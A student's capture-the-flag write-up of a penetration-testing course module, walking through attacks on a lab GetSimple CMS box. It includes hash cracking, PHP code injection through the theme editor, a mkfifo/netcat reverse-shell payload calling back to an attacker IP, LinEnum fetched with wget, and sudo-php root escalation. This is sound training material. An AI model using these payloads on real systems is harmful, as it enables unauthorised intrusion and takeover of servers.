# Penetration Testing - Getting Started
> I've omitted the theory sections, as there is nothing my notes add to the course material. Instead this is just to document my methodology for the practical sections of the course. Some of this was written retroactively, so it may not be perfectly accurate.
## Chapter 3 - Pentesting Basics
### Section 2 - Basic Tools
| Task | Solution |
| :--- | :--- |
| Grab the banner of the target server | `nc [ip] [port]` |

### Section 3 - Service Scanning
| Task | Solution |
| :--- | :--- |
| Find the version of the service running on port 8080 | `nmap -sV -p 8080 [ip]` |
| Identify the non-default port the telnet service is running on | `nmap -p- [ip]` |
| Find the flag | Identify shared folders with `smbclient -L //[ip]/ -N` to discover a `\users` share. Connect with bob's credentials using `smbclient //[ip]/users -U bob` and download the flag with `get flag.txt` |

### Section 4 - Web Enumeration
| Task | Solution 
| :--- | :--- |
| Find the flag | Enumerate the web server with `gobuster dir -u http://[ip]:[port]/ -w [path to wordlist]` to discover a wordpress admin panel. Use `curl` to discover the default credentials and log in to find the flag. |

### Section 5 - Public Exploits
| Task | Solution |
| :--- | :--- |
| Find the flag | Use `gobuster` to enumerate the web server and discover a wordpress page, which details a `simple backup` plugin. Use `searchsploit` to find a public exploit for this plugin, and use `msfconsole` to exploit it and read the flag. |

### Section 6 - Privilege Escalation
| Task | Solution |
| :--- | :--- |
| Find `user2`'s flag | Use `sudo -l` to discover that we can run `/bin/bash` as `user2`. Use `sudo -u user2 /bin/bash` to spawn a shell as `user2`, and read the flag. | 
| Escalate to root and find the final flag | Use `ls -ld /root/.ssh/` to discover that `user2` has read access to the root user's `.ssh` directory. Use `cat /root/.ssh/id_rsa` to read the private key, and use it to SSH into the root account with `ssh -i id_rsa root@[ip]`, who can read the final flag. |

## Chapter 5 - Nibbles
This chapter is a walkthrough of a real machine, which I think fits more as notes rather than a writeup, so I've included it in my [notes repo](https://github.com/bellamarzella/notes) instead of here.

## Chapter 7 - Knowledge Check
Finally, we have a mini box to test the whole module.
### Spawn the target, gain a foothold and submit the contents of the user.txt flag.
#### Web Enumeration
We'll begin by using `nmap -p- --min-rate 5000 [ip]` to enumerate the open ports on the target. This reveals that ports 22 and 80 are open. We can then use `nmap -sCV -p 22,80 [ip]` to enumerate the services running on those ports:

```shellsession
2/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see that `OpenSSH 8.2p1` is running on port 22, and `Apache httpd 2.4.41` is running on port 80. `whatweb` doesn't give anything interesting, but navigating to the webpage in our browser reveals the template for a GetSimple CMS installation. Scrolling through the source code doesn't give us anything at first glance either. However, `searchsploit getsimple` reveals a number of vulnerabilities across multiple versions. Let's continue enumerating to see if we can find anything else of interest, and pay particular attention to anything that might reveal the version of `GetSimple`.

We'll move onto a `GoBuster` scan:

```shellsession
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
admin                (Status: 301) [Size: 314] [--> http://10.129.77.140/admin/]
backups              (Status: 301) [Size: 316] [--> http://10.129.77.140/backups/]
data                 (Status: 301) [Size: 313] [--> http://10.129.77.140/data/]
index.php            (Status: 200) [Size: 5485]
plugins              (Status: 301) [Size: 316] [--> http://10.129.77.140/plugins/]
robots.txt           (Status: 200) [Size: 32]
server-status        (Status: 403) [Size: 278]
sitemap.xml          (Status: 200) [Size: 431]
theme                (Status: 301) [Size: 314] [--> http://10.129.77.140/theme/]
Progress: 4750 / 4750 (100.00%)
```

This reveals a number of interesting things. Let's go top down. `/admin` takes us to an admin login portal, visiting `/backups`, `/data` or `/theme` reveals that the web directory hasn't been disabled but `robot.txt` just excludes `/admin`, which we already knew existed. My first instinct was to guess `admin:admin` as the credentials for the admin login, which, lo and behold, worked! But I'm not sure whether that's the intended route, so let's move on for now.
We can find an interesting `admin.xml.bak` in `/backups/users/`, which, upon downloading and removing the `.bak` extension, seems to contain credentials for the `admin` user:

```xml
<item>
    <USR>admin</USR>
    <NAME/>
    <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
    <EMAIL>admin@gettingstarted.com</EMAIL>
    <HTMLEDITOR>1</HTMLEDITOR>
    <TIMEZONE/>
    <LANG>en_US</LANG>
</item>
```

That `<PWD>` line sure looks interesting, doesn't it ;)

Otherwise, `/backups` doesn't have much of note. A cursory glance through `/data` reveals the original `admin.xml` file, as well as `admin.xml.reset`, though all three of these seem identical. The only other thing of note is an API key that can be found in `/data/other/authorization.xml`.

We've reached a bit of a dead-end in regards to enumeration, so let's look more in depth at what we have, specifically that `<PWD>` line. It looks suspiciously like a hash, so let's run `hash-identifier` on it:
```shellsession
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```
Now let's use JohnTheRipper (or `hashcat`, but it's annoying in a VM) to crack it:
```shellsession
$ echo "d033e22ae348aeb5660fc2140aec35850c4da997" > hash.txt 
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
[...]
admin            (?) 
[...]
```
`john` cracks the hash to be `admin`, which we know is the correct password!

#### Admin Panel Enumeration
Now we've logged in, we can go back to poking around. Immediately, we'll notice the `Support` link is highlighted, and clicking it shows the version of GetSimple is `3.3.15`, which we saw is vulnerable. Let's look around some more before we use one of those though. Trying to smuggle in a `php` file through image uploads seems not to work, but the *Theme Editor* lets us directly edit `php` code that's already on the server!
Before we do that, let's try to access one of these files in `/theme`:
```shellsession
$ curl http://10.129.77.140/theme/Innovation/footer.inc.php                      
you cannot load this page directly. 
```
Oh, disappointing :(. Actually, this must mean that the page checks that we aren't accessing it directly, and, as established, we can view and maybe change this. Navigating to the Theme Editor and picking a `php` file at random, we'll see it begins with:
```php
<?php if(!defined('IN_GS')){ die('you cannot load this page directly.'); }
```
Aha, so that's the check. We could go through and figure out how this works, but does it actually matter? We know that `die('you cannot load this page directly.')` runs, so let's just replace it with a test payload:
```php
<?php if(!defined('IN_GS')){ system('id'); }
```
```html
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Nice! We can execute `php` code!

>**Note:**
>*We probably should understand what that PHP code does. `defined` is a function that checks whether a constant with the passed in name has been declared. We can extrapolate then that `IN_GS` means something like `in GetSimple` and is defined if the page is visited normally. From that, we can surmise that this line checks whether the page has been accessed directly, and if so kills the code and warns the user.*

#### Gaining a Reverse Shell
We've achieved RCE on the target. Let's leverage this to gain a reverse shell. We'll replace our test payload with a standard `php` payload, set up an `nc` listener and access the file:
```php
<?php if(!defined('IN_GS')){ system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.85 9443 >/tmp/f"); }
```
```shellsession
$ nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.17.85] from (UNKNOWN) [10.129.77.140] 59890
```

Nice, now let's upgrade this to a TTY. We can identify the server is running `Python 3.8.5` by running `python3 --version` (after `python --version` gets us nothing), so we can run a standard `python3` script to do so (explaining this is out of the scope of this writeup, see [tty-scripts](https://github.com/bellamarzella/notes/blob/main/cyber-security/concepts/shells/scripts/tty-upgrade.md) if you really need to know.).
Navigating to `/home/mrb3n` and reading `user.txt` reveals the first flag.

#### Gaining Root
We'll need to enumerate the linux system to find a vulnerability that lets us gain root. Let's start by running `LinEnum.sh`. On our attacker machine, we download the script from github, start a `html` server, navigate to `/tmp` on our victim machine so we have permission to write, then we can use `wget` to download the script onto the victim. Make sure we have permission to execute with `chmod` and then we can run it. If we pipe in  `grep -E $'(\033\[[0-9;]+m)'`, the output is limited to just highlighted lines, which makes parsing the output a lot easier. We'll notice:
```shellsession
[+] We can sudo without supplying a password!
[+] Possible sudo pwnage!
```
Looking at these lines in the full script output, we'll see:
```shellsession
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php


[+] Possible sudo pwnage!
/usr/bin/php
```
We can run `/usr/bin/php` as root. Let's look at this file in more detail:
```shellsession
www-data@gettingstarted:/usr/bin$ ls -l php
lrwxrwxrwx 1 root root 21 Feb  9  2021 php -> /etc/alternatives/php
```
At first, this looks promising, but the second half is concerning. This indicates that this file is actually a `symlink` (essentially a shortcut). Checking the specified path, we find another symlink, and then the original file. Unfortunately, we don't have write permissions on this file.
Except we're being a little obtuse here. It's not just any file, it's `php`. We can run `php` code as `root`, which will definitely give us a way to gain a root shell.
In fact, `system()` just lets us run Linux commands. So, we can run `sudo php -r "system('/bin/bash');"` to spawn a root shell!
Finally, we read `/root/root.txt` to get our flag.

>**Note:** *We almost definitely could've just used an existing exploit that we found earlier, but this was more fun, wasn't it :)* 


